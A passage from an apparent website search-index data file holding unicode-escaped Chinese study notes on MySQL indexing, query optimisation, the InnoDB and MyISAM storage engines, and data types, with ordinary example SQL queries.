\u8F85\u52A9\u7D22\u5F15\u7684\u53F6\u5B50\u8282\u70B9\u7684 data \u57DF\u8BB0\u5F55\u7740\u4E3B\u952E\u7684\u503C\uFF0C\u56E0\u6B64\u5728\u4F7F\u7528\u8F85\u52A9\u7D22\u5F15\u8FDB\u884C\u67E5\u627E\u65F6\uFF0C\u9700\u8981\u5148\u67E5\u627E\u5230\u4E3B\u952E\u503C\uFF0C\u7136\u540E\u518D\u5230\u4E3B\u7D22\u5F15\u4E2D\u8FDB\u884C\u67E5\u627E\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c349b91-050b-4d72-a7f8-ec86320307ea.png" width="350px">`},{header:"2. \u54C8\u5E0C\u7D22\u5F15",slug:"_2-\u54C8\u5E0C\u7D22\u5F15",content:`\u54C8\u5E0C\u7D22\u5F15\u80FD\u4EE5 O(1) \u65F6\u95F4\u8FDB\u884C\u67E5\u627E\uFF0C\u4F46\u662F\u5931\u53BB\u4E86\u6709\u5E8F\u6027\uFF1A \u65E0\u6CD5\u7528\u4E8E\u6392\u5E8F\u4E0E\u5206\u7EC4\uFF1B
\u53EA\u652F\u6301\u7CBE\u786E\u67E5\u627E\uFF0C\u65E0\u6CD5\u7528\u4E8E\u90E8\u5206\u67E5\u627E\u548C\u8303\u56F4\u67E5\u627E\u3002 InnoDB \u5B58\u50A8\u5F15\u64CE\u6709\u4E00\u4E2A\u7279\u6B8A\u7684\u529F\u80FD\u53EB\u201C\u81EA\u9002\u5E94\u54C8\u5E0C\u7D22\u5F15\u201D\uFF0C\u5F53\u67D0\u4E2A\u7D22\u5F15\u503C\u88AB\u4F7F\u7528\u7684\u975E\u5E38\u9891\u7E41\u65F6\uFF0C\u4F1A\u5728 B+Tree \u7D22\u5F15\u4E4B\u4E0A\u518D\u521B\u5EFA\u4E00\u4E2A\u54C8\u5E0C\u7D22\u5F15\uFF0C\u8FD9\u6837\u5C31\u8BA9 B+Tree \u7D22\u5F15\u5177\u6709\u54C8\u5E0C\u7D22\u5F15\u7684\u4E00\u4E9B\u4F18\u70B9\uFF0C\u6BD4\u5982\u5FEB\u901F\u7684\u54C8\u5E0C\u67E5\u627E\u3002`},{header:"3. \u5168\u6587\u7D22\u5F15",slug:"_3-\u5168\u6587\u7D22\u5F15",content:`MyISAM \u5B58\u50A8\u5F15\u64CE\u652F\u6301\u5168\u6587\u7D22\u5F15\uFF0C\u7528\u4E8E\u67E5\u627E\u6587\u672C\u4E2D\u7684\u5173\u952E\u8BCD\uFF0C\u800C\u4E0D\u662F\u76F4\u63A5\u6BD4\u8F83\u662F\u5426\u76F8\u7B49\u3002
\u67E5\u627E\u6761\u4EF6\u4F7F\u7528 MATCH AGAINST\uFF0C\u800C\u4E0D\u662F\u666E\u901A\u7684 WHERE\u3002
\u5168\u6587\u7D22\u5F15\u4F7F\u7528\u5012\u6392\u7D22\u5F15\u5B9E\u73B0\uFF0C\u5B83\u8BB0\u5F55\u7740\u5173\u952E\u8BCD\u5230\u5176\u6240\u5728\u6587\u6863\u7684\u6620\u5C04\u3002
InnoDB \u5B58\u50A8\u5F15\u64CE\u5728 MySQL 5.6.4 \u7248\u672C\u4E2D\u4E5F\u5F00\u59CB\u652F\u6301\u5168\u6587\u7D22\u5F15\u3002`},{header:"4. \u7A7A\u95F4\u6570\u636E\u7D22\u5F15",slug:"_4-\u7A7A\u95F4\u6570\u636E\u7D22\u5F15",content:`MyISAM \u5B58\u50A8\u5F15\u64CE\u652F\u6301\u7A7A\u95F4\u6570\u636E\u7D22\u5F15\uFF08R-Tree\uFF09\uFF0C\u53EF\u4EE5\u7528\u4E8E\u5730\u7406\u6570\u636E\u5B58\u50A8\u3002\u7A7A\u95F4\u6570\u636E\u7D22\u5F15\u4F1A\u4ECE\u6240\u6709\u7EF4\u5EA6\u6765\u7D22\u5F15\u6570\u636E\uFF0C\u53EF\u4EE5\u6709\u6548\u5730\u4F7F\u7528\u4EFB\u610F\u7EF4\u5EA6\u6765\u8FDB\u884C\u7EC4\u5408\u67E5\u8BE2\u3002
\u5FC5\u987B\u4F7F\u7528 GIS \u76F8\u5173\u7684\u51FD\u6570\u6765\u7EF4\u62A4\u6570\u636E\u3002`},{header:"\u7D22\u5F15\u4F18\u5316",slug:"\u7D22\u5F15\u4F18\u5316",content:""},{header:"1. \u72EC\u7ACB\u7684\u5217",slug:"_1-\u72EC\u7ACB\u7684\u5217",content:`\u5728\u8FDB\u884C\u67E5\u8BE2\u65F6\uFF0C\u7D22\u5F15\u5217\u4E0D\u80FD\u662F\u8868\u8FBE\u5F0F\u7684\u4E00\u90E8\u5206\uFF0C\u4E5F\u4E0D\u80FD\u662F\u51FD\u6570\u7684\u53C2\u6570\uFF0C\u5426\u5219\u65E0\u6CD5\u4F7F\u7528\u7D22\u5F15\u3002
\u4F8B\u5982\u4E0B\u9762\u7684\u67E5\u8BE2\u4E0D\u80FD\u4F7F\u7528 actor_id \u5217\u7684\u7D22\u5F15\uFF1A
SELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5;`},{header:"2. \u591A\u5217\u7D22\u5F15",slug:"_2-\u591A\u5217\u7D22\u5F15",content:`\u5728\u9700\u8981\u4F7F\u7528\u591A\u4E2A\u5217\u4F5C\u4E3A\u6761\u4EF6\u8FDB\u884C\u67E5\u8BE2\u65F6\uFF0C\u4F7F\u7528\u591A\u5217\u7D22\u5F15\u6BD4\u4F7F\u7528\u591A\u4E2A\u5355\u5217\u7D22\u5F15\u6027\u80FD\u66F4\u597D\u3002\u4F8B\u5982\u4E0B\u9762\u7684\u8BED\u53E5\u4E2D\uFF0C\u6700\u597D\u628A actor_id \u548C film_id \u8BBE\u7F6E\u4E3A\u591A\u5217\u7D22\u5F15\u3002
SELECT film_id, actor_ id FROM sakila.film_actor
WHERE actor_id = 1 AND film_id = 1;`},{header:"3. \u7D22\u5F15\u5217\u7684\u987A\u5E8F",slug:"_3-\u7D22\u5F15\u5217\u7684\u987A\u5E8F",content:`\u8BA9\u9009\u62E9\u6027\u6700\u5F3A\u7684\u7D22\u5F15\u5217\u653E\u5728\u524D\u9762\u3002
\u7D22\u5F15\u7684\u9009\u62E9\u6027\u662F\u6307\uFF1A\u4E0D\u91CD\u590D\u7684\u7D22\u5F15\u503C\u548C\u8BB0\u5F55\u603B\u6570\u7684\u6BD4\u503C\u3002\u6700\u5927\u503C\u4E3A 1\uFF0C\u6B64\u65F6\u6BCF\u4E2A\u8BB0\u5F55\u90FD\u6709\u552F\u4E00\u7684\u7D22\u5F15\u4E0E\u5176\u5BF9\u5E94\u3002\u9009\u62E9\u6027\u8D8A\u9AD8\uFF0C\u6BCF\u4E2A\u8BB0\u5F55\u7684\u533A\u5206\u5EA6\u8D8A\u9AD8\uFF0C\u67E5\u8BE2\u6548\u7387\u4E5F\u8D8A\u9AD8\u3002
\u4F8B\u5982\u4E0B\u9762\u663E\u793A\u7684\u7ED3\u679C\u4E2D customer_id \u7684\u9009\u62E9\u6027\u6BD4 staff_id \u66F4\u9AD8\uFF0C\u56E0\u6B64\u6700\u597D\u628A customer_id \u5217\u653E\u5728\u591A\u5217\u7D22\u5F15\u7684\u524D\u9762\u3002
SELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity,
COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity,
COUNT(*)
FROM payment; staff_id_selectivity: 0.0001
customer_id_selectivity: 0.0373 COUNT(*): 16049`},{header:"4. \u524D\u7F00\u7D22\u5F15",slug:"_4-\u524D\u7F00\u7D22\u5F15",content:`\u5BF9\u4E8E BLOB\u3001TEXT \u548C VARCHAR \u7C7B\u578B\u7684\u5217\uFF0C\u5FC5\u987B\u4F7F\u7528\u524D\u7F00\u7D22\u5F15\uFF0C\u53EA\u7D22\u5F15\u5F00\u59CB\u7684\u90E8\u5206\u5B57\u7B26\u3002
\u524D\u7F00\u957F\u5EA6\u7684\u9009\u53D6\u9700\u8981\u6839\u636E\u7D22\u5F15\u9009\u62E9\u6027\u6765\u786E\u5B9A\u3002`},{header:"5. \u8986\u76D6\u7D22\u5F15",slug:"_5-\u8986\u76D6\u7D22\u5F15",content:`\u7D22\u5F15\u5305\u542B\u6240\u6709\u9700\u8981\u67E5\u8BE2\u7684\u5B57\u6BB5\u7684\u503C\u3002
\u5177\u6709\u4EE5\u4E0B\u4F18\u70B9\uFF1A \u7D22\u5F15\u901A\u5E38\u8FDC\u5C0F\u4E8E\u6570\u636E\u884C\u7684\u5927\u5C0F\uFF0C\u53EA\u8BFB\u53D6\u7D22\u5F15\u80FD\u5927\u5927\u51CF\u5C11\u6570\u636E\u8BBF\u95EE\u91CF\u3002
\u4E00\u4E9B\u5B58\u50A8\u5F15\u64CE\uFF08\u4F8B\u5982 MyISAM\uFF09\u5728\u5185\u5B58\u4E2D\u53EA\u7F13\u5B58\u7D22\u5F15\uFF0C\u800C\u6570\u636E\u4F9D\u8D56\u4E8E\u64CD\u4F5C\u7CFB\u7EDF\u6765\u7F13\u5B58\u3002\u56E0\u6B64\uFF0C\u53EA\u8BBF\u95EE\u7D22\u5F15\u53EF\u4EE5\u4E0D\u4F7F\u7528\u7CFB\u7EDF\u8C03\u7528\uFF08\u901A\u5E38\u6BD4\u8F83\u8D39\u65F6\uFF09\u3002
\u5BF9\u4E8E InnoDB \u5F15\u64CE\uFF0C\u82E5\u8F85\u52A9\u7D22\u5F15\u80FD\u591F\u8986\u76D6\u67E5\u8BE2\uFF0C\u5219\u65E0\u9700\u8BBF\u95EE\u4E3B\u7D22\u5F15\u3002`},{header:"\u7D22\u5F15\u7684\u4F18\u70B9",slug:"\u7D22\u5F15\u7684\u4F18\u70B9",content:"\u5927\u5927\u51CF\u5C11\u4E86\u670D\u52A1\u5668\u9700\u8981\u626B\u63CF\u7684\u6570\u636E\u884C\u6570\u3002 \u5E2E\u52A9\u670D\u52A1\u5668\u907F\u514D\u8FDB\u884C\u6392\u5E8F\u548C\u5206\u7EC4\uFF0C\u4EE5\u53CA\u907F\u514D\u521B\u5EFA\u4E34\u65F6\u8868\uFF08B+Tree \u7D22\u5F15\u662F\u6709\u5E8F\u7684\uFF0C\u53EF\u4EE5\u7528\u4E8E ORDER BY \u548C GROUP BY \u64CD\u4F5C\u3002\u4E34\u65F6\u8868\u4E3B\u8981\u662F\u5728\u6392\u5E8F\u548C\u5206\u7EC4\u8FC7\u7A0B\u4E2D\u521B\u5EFA\uFF0C\u4E0D\u9700\u8981\u6392\u5E8F\u548C\u5206\u7EC4\uFF0C\u4E5F\u5C31\u4E0D\u9700\u8981\u521B\u5EFA\u4E34\u65F6\u8868\uFF09\u3002 \u5C06\u968F\u673A I/O \u53D8\u4E3A\u987A\u5E8F I/O\uFF08B+Tree \u7D22\u5F15\u662F\u6709\u5E8F\u7684\uFF0C\u4F1A\u5C06\u76F8\u90BB\u7684\u6570\u636E\u90FD\u5B58\u50A8\u5728\u4E00\u8D77\uFF09\u3002"},{header:"\u7D22\u5F15\u7684\u4F7F\u7528\u6761\u4EF6",slug:"\u7D22\u5F15\u7684\u4F7F\u7528\u6761\u4EF6",content:"\u5BF9\u4E8E\u975E\u5E38\u5C0F\u7684\u8868\u3001\u5927\u90E8\u5206\u60C5\u51B5\u4E0B\u7B80\u5355\u7684\u5168\u8868\u626B\u63CF\u6BD4\u5EFA\u7ACB\u7D22\u5F15\u66F4\u9AD8\u6548\uFF1B \u5BF9\u4E8E\u4E2D\u5230\u5927\u578B\u7684\u8868\uFF0C\u7D22\u5F15\u5C31\u975E\u5E38\u6709\u6548\uFF1B \u4F46\u662F\u5BF9\u4E8E\u7279\u5927\u578B\u7684\u8868\uFF0C\u5EFA\u7ACB\u548C\u7EF4\u62A4\u7D22\u5F15\u7684\u4EE3\u4EF7\u5C06\u4F1A\u968F\u4E4B\u589E\u957F\u3002\u8FD9\u79CD\u60C5\u51B5\u4E0B\uFF0C\u9700\u8981\u7528\u5230\u4E00\u79CD\u6280\u672F\u53EF\u4EE5\u76F4\u63A5\u533A\u5206\u51FA\u9700\u8981\u67E5\u8BE2\u7684\u4E00\u7EC4\u6570\u636E\uFF0C\u800C\u4E0D\u662F\u4E00\u6761\u8BB0\u5F55\u4E00\u6761\u8BB0\u5F55\u5730\u5339\u914D\uFF0C\u4F8B\u5982\u53EF\u4EE5\u4F7F\u7528\u5206\u533A\u6280\u672F\u3002"},{header:"\u4E8C\u3001\u67E5\u8BE2\u6027\u80FD\u4F18\u5316",slug:"\u4E8C\u3001\u67E5\u8BE2\u6027\u80FD\u4F18\u5316",content:""},{header:"\u4F7F\u7528 Explain \u8FDB\u884C\u5206\u6790",slug:"\u4F7F\u7528-explain-\u8FDB\u884C\u5206\u6790",content:`Explain \u7528\u6765\u5206\u6790 SELECT \u67E5\u8BE2\u8BED\u53E5\uFF0C\u5F00\u53D1\u4EBA\u5458\u53EF\u4EE5\u901A\u8FC7\u5206\u6790 Explain \u7ED3\u679C\u6765\u4F18\u5316\u67E5\u8BE2\u8BED\u53E5\u3002
\u6BD4\u8F83\u91CD\u8981\u7684\u5B57\u6BB5\u6709\uFF1A select_type : \u67E5\u8BE2\u7C7B\u578B\uFF0C\u6709\u7B80\u5355\u67E5\u8BE2\u3001\u8054\u5408\u67E5\u8BE2\u3001\u5B50\u67E5\u8BE2\u7B49
key : \u4F7F\u7528\u7684\u7D22\u5F15
rows : \u626B\u63CF\u7684\u884C\u6570`},{header:"\u4F18\u5316\u6570\u636E\u8BBF\u95EE",slug:"\u4F18\u5316\u6570\u636E\u8BBF\u95EE",content:""},{header:"1. \u51CF\u5C11\u8BF7\u6C42\u7684\u6570\u636E\u91CF",slug:"_1-\u51CF\u5C11\u8BF7\u6C42\u7684\u6570\u636E\u91CF",content:`\u53EA\u8FD4\u56DE\u5FC5\u8981\u7684\u5217\uFF1A\u6700\u597D\u4E0D\u8981\u4F7F\u7528 SELECT * \u8BED\u53E5\u3002
\u53EA\u8FD4\u56DE\u5FC5\u8981\u7684\u884C\uFF1A\u4F7F\u7528 LIMIT \u8BED\u53E5\u6765\u9650\u5236\u8FD4\u56DE\u7684\u6570\u636E\u3002
\u7F13\u5B58\u91CD\u590D\u67E5\u8BE2\u7684\u6570\u636E\uFF1A\u4F7F\u7528\u7F13\u5B58\u53EF\u4EE5\u907F\u514D\u5728\u6570\u636E\u5E93\u4E2D\u8FDB\u884C\u67E5\u8BE2\uFF0C\u7279\u522B\u5728\u8981\u67E5\u8BE2\u7684\u6570\u636E\u7ECF\u5E38\u88AB\u91CD\u590D\u67E5\u8BE2\u65F6\uFF0C\u7F13\u5B58\u5E26\u6765\u7684\u67E5\u8BE2\u6027\u80FD\u63D0\u5347\u5C06\u4F1A\u662F\u975E\u5E38\u660E\u663E\u7684\u3002`},{header:"2. \u51CF\u5C11\u670D\u52A1\u5668\u7AEF\u626B\u63CF\u7684\u884C\u6570",slug:"_2-\u51CF\u5C11\u670D\u52A1\u5668\u7AEF\u626B\u63CF\u7684\u884C\u6570",content:"\u6700\u6709\u6548\u7684\u65B9\u5F0F\u662F\u4F7F\u7528\u7D22\u5F15\u6765\u8986\u76D6\u67E5\u8BE2\u3002"},{header:"\u91CD\u6784\u67E5\u8BE2\u65B9\u5F0F",slug:"\u91CD\u6784\u67E5\u8BE2\u65B9\u5F0F",content:""},{header:"1. \u5207\u5206\u5927\u67E5\u8BE2",slug:"_1-\u5207\u5206\u5927\u67E5\u8BE2",content:`\u4E00\u4E2A\u5927\u67E5\u8BE2\u5982\u679C\u4E00\u6B21\u6027\u6267\u884C\u7684\u8BDD\uFF0C\u53EF\u80FD\u4E00\u6B21\u9501\u4F4F\u5F88\u591A\u6570\u636E\u3001\u5360\u6EE1\u6574\u4E2A\u4E8B\u52A1\u65E5\u5FD7\u3001\u8017\u5C3D\u7CFB\u7EDF\u8D44\u6E90\u3001\u963B\u585E\u5F88\u591A\u5C0F\u7684\u4F46\u91CD\u8981\u7684\u67E5\u8BE2\u3002
DELETE FROM messages WHERE create < DATE_SUB(NOW(), INTERVAL 3 MONTH);
rows_affected = 0
do { rows_affected = do_query( "DELETE FROM messages WHERE create < DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000")
} while rows_affected > 0`},{header:"2. \u5206\u89E3\u5927\u8FDE\u63A5\u67E5\u8BE2",slug:"_2-\u5206\u89E3\u5927\u8FDE\u63A5\u67E5\u8BE2",content:`\u5C06\u4E00\u4E2A\u5927\u8FDE\u63A5\u67E5\u8BE2\u5206\u89E3\u6210\u5BF9\u6BCF\u4E00\u4E2A\u8868\u8FDB\u884C\u4E00\u6B21\u5355\u8868\u67E5\u8BE2\uFF0C\u7136\u540E\u5728\u5E94\u7528\u7A0B\u5E8F\u4E2D\u8FDB\u884C\u5173\u8054\uFF0C\u8FD9\u6837\u505A\u7684\u597D\u5904\u6709\uFF1A \u8BA9\u7F13\u5B58\u66F4\u9AD8\u6548\u3002\u5BF9\u4E8E\u8FDE\u63A5\u67E5\u8BE2\uFF0C\u5982\u679C\u5176\u4E2D\u4E00\u4E2A\u8868\u53D1\u751F\u53D8\u5316\uFF0C\u90A3\u4E48\u6574\u4E2A\u67E5\u8BE2\u7F13\u5B58\u5C31\u65E0\u6CD5\u4F7F\u7528\u3002\u800C\u5206\u89E3\u540E\u7684\u591A\u4E2A\u67E5\u8BE2\uFF0C\u5373\u4F7F\u5176\u4E2D\u4E00\u4E2A\u8868\u53D1\u751F\u53D8\u5316\uFF0C\u5BF9\u5176\u5B83\u8868\u7684\u67E5\u8BE2\u7F13\u5B58\u4F9D\u7136\u53EF\u4EE5\u4F7F\u7528\u3002
\u5206\u89E3\u6210\u591A\u4E2A\u5355\u8868\u67E5\u8BE2\uFF0C\u8FD9\u4E9B\u5355\u8868\u67E5\u8BE2\u7684\u7F13\u5B58\u7ED3\u679C\u66F4\u53EF\u80FD\u88AB\u5176\u5B83\u67E5\u8BE2\u4F7F\u7528\u5230\uFF0C\u4ECE\u800C\u51CF\u5C11\u5197\u4F59\u8BB0\u5F55\u7684\u67E5\u8BE2\u3002
\u51CF\u5C11\u9501\u7ADE\u4E89\uFF1B
\u5728\u5E94\u7528\u5C42\u8FDB\u884C\u8FDE\u63A5\uFF0C\u53EF\u4EE5\u66F4\u5BB9\u6613\u5BF9\u6570\u636E\u5E93\u8FDB\u884C\u62C6\u5206\uFF0C\u4ECE\u800C\u66F4\u5BB9\u6613\u505A\u5230\u9AD8\u6027\u80FD\u548C\u53EF\u4F38\u7F29\u3002
\u67E5\u8BE2\u672C\u8EAB\u6548\u7387\u4E5F\u53EF\u80FD\u4F1A\u6709\u6240\u63D0\u5347\u3002\u4F8B\u5982\u4E0B\u9762\u7684\u4F8B\u5B50\u4E2D\uFF0C\u4F7F\u7528 IN() \u4EE3\u66FF\u8FDE\u63A5\u67E5\u8BE2\uFF0C\u53EF\u4EE5\u8BA9 MySQL \u6309\u7167 ID \u987A\u5E8F\u8FDB\u884C\u67E5\u8BE2\uFF0C\u8FD9\u53EF\u80FD\u6BD4\u968F\u673A\u7684\u8FDE\u63A5\u8981\u66F4\u9AD8\u6548\u3002 SELECT * FROM tag
JOIN tag_post ON tag_post.tag_id=tag.id
JOIN post ON tag_post.post_id=post.id
WHERE tag.tag='mysql';
SELECT * FROM tag WHERE tag='mysql';
SELECT * FROM tag_post WHERE tag_id=1234;
SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904);`},{header:"\u4E09\u3001\u5B58\u50A8\u5F15\u64CE",slug:"\u4E09\u3001\u5B58\u50A8\u5F15\u64CE",content:""},{header:"InnoDB",slug:"innodb",content:`\u662F MySQL \u9ED8\u8BA4\u7684\u4E8B\u52A1\u578B\u5B58\u50A8\u5F15\u64CE\uFF0C\u53EA\u6709\u5728\u9700\u8981\u5B83\u4E0D\u652F\u6301\u7684\u7279\u6027\u65F6\uFF0C\u624D\u8003\u8651\u4F7F\u7528\u5176\u5B83\u5B58\u50A8\u5F15\u64CE\u3002
\u5B9E\u73B0\u4E86\u56DB\u4E2A\u6807\u51C6\u7684\u9694\u79BB\u7EA7\u522B\uFF0C\u9ED8\u8BA4\u7EA7\u522B\u662F\u53EF\u91CD\u590D\u8BFB\uFF08REPEATABLE READ\uFF09\u3002\u5728\u53EF\u91CD\u590D\u8BFB\u9694\u79BB\u7EA7\u522B\u4E0B\uFF0C\u901A\u8FC7\u591A\u7248\u672C\u5E76\u53D1\u63A7\u5236\uFF08MVCC\uFF09+ Next-Key Locking \u9632\u6B62\u5E7B\u5F71\u8BFB\u3002
\u4E3B\u7D22\u5F15\u662F\u805A\u7C07\u7D22\u5F15\uFF0C\u5728\u7D22\u5F15\u4E2D\u4FDD\u5B58\u4E86\u6570\u636E\uFF0C\u4ECE\u800C\u907F\u514D\u76F4\u63A5\u8BFB\u53D6\u78C1\u76D8\uFF0C\u56E0\u6B64\u5BF9\u67E5\u8BE2\u6027\u80FD\u6709\u5F88\u5927\u7684\u63D0\u5347\u3002
\u5185\u90E8\u505A\u4E86\u5F88\u591A\u4F18\u5316\uFF0C\u5305\u62EC\u4ECE\u78C1\u76D8\u8BFB\u53D6\u6570\u636E\u65F6\u91C7\u7528\u7684\u53EF\u9884\u6D4B\u6027\u8BFB\u3001\u80FD\u591F\u52A0\u5FEB\u8BFB\u64CD\u4F5C\u5E76\u4E14\u81EA\u52A8\u521B\u5EFA\u7684\u81EA\u9002\u5E94\u54C8\u5E0C\u7D22\u5F15\u3001\u80FD\u591F\u52A0\u901F\u63D2\u5165\u64CD\u4F5C\u7684\u63D2\u5165\u7F13\u51B2\u533A\u7B49\u3002
\u652F\u6301\u771F\u6B63\u7684\u5728\u7EBF\u70ED\u5907\u4EFD\u3002\u5176\u5B83\u5B58\u50A8\u5F15\u64CE\u4E0D\u652F\u6301\u5728\u7EBF\u70ED\u5907\u4EFD\uFF0C\u8981\u83B7\u53D6\u4E00\u81F4\u6027\u89C6\u56FE\u9700\u8981\u505C\u6B62\u5BF9\u6240\u6709\u8868\u7684\u5199\u5165\uFF0C\u800C\u5728\u8BFB\u5199\u6DF7\u5408\u573A\u666F\u4E2D\uFF0C\u505C\u6B62\u5199\u5165\u53EF\u80FD\u4E5F\u610F\u5473\u7740\u505C\u6B62\u8BFB\u53D6\u3002`},{header:"MyISAM",slug:"myisam",content:`\u8BBE\u8BA1\u7B80\u5355\uFF0C\u6570\u636E\u4EE5\u7D27\u5BC6\u683C\u5F0F\u5B58\u50A8\u3002\u5BF9\u4E8E\u53EA\u8BFB\u6570\u636E\uFF0C\u6216\u8005\u8868\u6BD4\u8F83\u5C0F\u3001\u53EF\u4EE5\u5BB9\u5FCD\u4FEE\u590D\u64CD\u4F5C\uFF0C\u5219\u4F9D\u7136\u53EF\u4EE5\u4F7F\u7528\u5B83\u3002
\u63D0\u4F9B\u4E86\u5927\u91CF\u7684\u7279\u6027\uFF0C\u5305\u62EC\u538B\u7F29\u8868\u3001\u7A7A\u95F4\u6570\u636E\u7D22\u5F15\u7B49\u3002
\u4E0D\u652F\u6301\u4E8B\u52A1\u3002
\u4E0D\u652F\u6301\u884C\u7EA7\u9501\uFF0C\u53EA\u80FD\u5BF9\u6574\u5F20\u8868\u52A0\u9501\uFF0C\u8BFB\u53D6\u65F6\u4F1A\u5BF9\u9700\u8981\u8BFB\u5230\u7684\u6240\u6709\u8868\u52A0\u5171\u4EAB\u9501\uFF0C\u5199\u5165\u65F6\u5219\u5BF9\u8868\u52A0\u6392\u5B83\u9501\u3002\u4F46\u5728\u8868\u6709\u8BFB\u53D6\u64CD\u4F5C\u7684\u540C\u65F6\uFF0C\u4E5F\u53EF\u4EE5\u5F80\u8868\u4E2D\u63D2\u5165\u65B0\u7684\u8BB0\u5F55\uFF0C\u8FD9\u88AB\u79F0\u4E3A\u5E76\u53D1\u63D2\u5165\uFF08CONCURRENT INSERT\uFF09\u3002
\u53EF\u4EE5\u624B\u5DE5\u6216\u8005\u81EA\u52A8\u6267\u884C\u68C0\u67E5\u548C\u4FEE\u590D\u64CD\u4F5C\uFF0C\u4F46\u662F\u548C\u4E8B\u52A1\u6062\u590D\u4EE5\u53CA\u5D29\u6E83\u6062\u590D\u4E0D\u540C\uFF0C\u53EF\u80FD\u5BFC\u81F4\u4E00\u4E9B\u6570\u636E\u4E22\u5931\uFF0C\u800C\u4E14\u4FEE\u590D\u64CD\u4F5C\u662F\u975E\u5E38\u6162\u7684\u3002
\u5982\u679C\u6307\u5B9A\u4E86 DELAY_KEY_WRITE \u9009\u9879\uFF0C\u5728\u6BCF\u6B21\u4FEE\u6539\u6267\u884C\u5B8C\u6210\u65F6\uFF0C\u4E0D\u4F1A\u7ACB\u5373\u5C06\u4FEE\u6539\u7684\u7D22\u5F15\u6570\u636E\u5199\u5165\u78C1\u76D8\uFF0C\u800C\u662F\u4F1A\u5199\u5230\u5185\u5B58\u4E2D\u7684\u952E\u7F13\u51B2\u533A\uFF0C\u53EA\u6709\u5728\u6E05\u7406\u952E\u7F13\u51B2\u533A\u6216\u8005\u5173\u95ED\u8868\u7684\u65F6\u5019\u624D\u4F1A\u5C06\u5BF9\u5E94\u7684\u7D22\u5F15\u5757\u5199\u5165\u78C1\u76D8\u3002\u8FD9\u79CD\u65B9\u5F0F\u53EF\u4EE5\u6781\u5927\u7684\u63D0\u5347\u5199\u5165\u6027\u80FD\uFF0C\u4F46\u662F\u5728\u6570\u636E\u5E93\u6216\u8005\u4E3B\u673A\u5D29\u6E83\u65F6\u4F1A\u9020\u6210\u7D22\u5F15\u635F\u574F\uFF0C\u9700\u8981\u6267\u884C\u4FEE\u590D\u64CD\u4F5C\u3002`},{header:"\u6BD4\u8F83",slug:"\u6BD4\u8F83",content:"\u4E8B\u52A1\uFF1AInnoDB \u662F\u4E8B\u52A1\u578B\u7684\uFF0C\u53EF\u4EE5\u4F7F\u7528 Commit \u548C Rollback \u8BED\u53E5\u3002 \u5E76\u53D1\uFF1AMyISAM \u53EA\u652F\u6301\u8868\u7EA7\u9501\uFF0C\u800C InnoDB \u8FD8\u652F\u6301\u884C\u7EA7\u9501\u3002 \u5916\u952E\uFF1AInnoDB \u652F\u6301\u5916\u952E\u3002 \u5907\u4EFD\uFF1AInnoDB \u652F\u6301\u5728\u7EBF\u70ED\u5907\u4EFD\u3002 \u5D29\u6E83\u6062\u590D\uFF1AMyISAM \u5D29\u6E83\u540E\u53D1\u751F\u635F\u574F\u7684\u6982\u7387\u6BD4 InnoDB \u9AD8\u5F88\u591A\uFF0C\u800C\u4E14\u6062\u590D\u7684\u901F\u5EA6\u4E5F\u66F4\u6162\u3002 \u5176\u5B83\u7279\u6027\uFF1AMyISAM \u652F\u6301\u538B\u7F29\u8868\u548C\u7A7A\u95F4\u6570\u636E\u7D22\u5F15\u3002"},{header:"\u56DB\u3001\u6570\u636E\u7C7B\u578B",slug:"\u56DB\u3001\u6570\u636E\u7C7B\u578B",content:""},{header:"\u6574\u578B",slug:"\u6574\u578B",content:`TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT \u5206\u522B\u4F7F\u7528 8, 16, 24, 32, 64 \u4F4D\u5B58\u50A8\u7A7A\u95F4\uFF0C\u4E00\u822C\u60C5\u51B5\u4E0B\u8D8A\u5C0F\u7684\u5217\u8D8A\u597D\u3002
INT(11) \u4E2D\u7684\u6570\u5B57\u53EA\u662F\u89C4\u5B9A\u4E86\u4EA4\u4E92\u5DE5\u5177\u663E\u793A\u5B57\u7B26\u7684\u4E2A\u6570\uFF0C\u5BF9\u4E8E\u5B58\u50A8\u548C\u8BA1\u7B97\u6765\u8BF4\u662F\u6CA1\u6709\u610F\u4E49\u7684\u3002`},{header:"\u6D6E\u70B9\u6570",slug:"\u6D6E\u70B9\u6570",content:`FLOAT \u548C DOUBLE \u4E3A\u6D6E\u70B9\u7C7B\u578B\uFF0CDECIMAL \u4E3A\u9AD8\u7CBE\u5EA6\u5C0F\u6570\u7C7B\u578B\u3002CPU \u539F\u751F\u652F\u6301\u6D6E\u70B9\u8FD0\u7B97\uFF0C\u4F46\u662F\u4E0D\u652F\u6301 DECIMAl \u7C7B\u578B\u7684\u8BA1\u7B97\uFF0C\u56E0\u6B64 DECIMAL \u7684\u8BA1\u7B97\u6BD4\u6D6E\u70B9\u7C7B\u578B\u9700\u8981\u66F4\u9AD8\u7684\u4EE3\u4EF7\u3002
FLOAT\u3001DOUBLE \u548C DECIMAL \u90FD\u53EF\u4EE5\u6307\u5B9A\u5217\u5BBD\uFF0C\u4F8B\u5982 DECIMAL(18, 9) \u8868\u793A\u603B\u5171 18 \u4F4D\uFF0C\u53D6 9 \u4F4D\u5B58\u50A8\u5C0F\u6570\u90E8\u5206\uFF0C\u5269\u4E0B 9 \u4F4D\u5B58\u50A8\u6574\u6570\u90E8\u5206\u3002`},{header:"\u5B57\u7B26\u4E32",slug:"\u5B57\u7B26\u4E32",content:`\u4E3B\u8981\u6709 CHAR \u548C VARCHAR \u4E24\u79CD\u7C7B\u578B\uFF0C\u4E00\u79CD\u662F\u5B9A\u957F\u7684\uFF0C\u4E00\u79CD\u662F\u53D8\u957F\u7684\u3002
